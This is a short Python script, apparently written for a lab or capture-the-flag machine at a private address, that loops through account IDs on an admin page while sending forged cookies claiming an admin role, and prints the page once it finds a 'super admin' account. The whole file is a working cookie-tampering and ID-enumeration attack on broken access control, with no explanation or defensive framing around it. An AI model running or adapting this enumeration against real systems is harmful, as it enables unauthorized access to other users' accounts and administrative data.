import requests 

maxAccId = 100
accId = 0

while accId < maxAccId:
	print("Attempt: " + str(accId))

	url = "http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id="+str(accId)
	cookies = {"role":"admin","user":"34322"}
	response = requests.get(url= url, cookies=cookies)

	if "super admin" in response.text or "Super Admin" in response.text:
		print("FOUND: " + str(accId))
		print(response.text)
		break;
	accId += 1

print("ENUM ENDED")

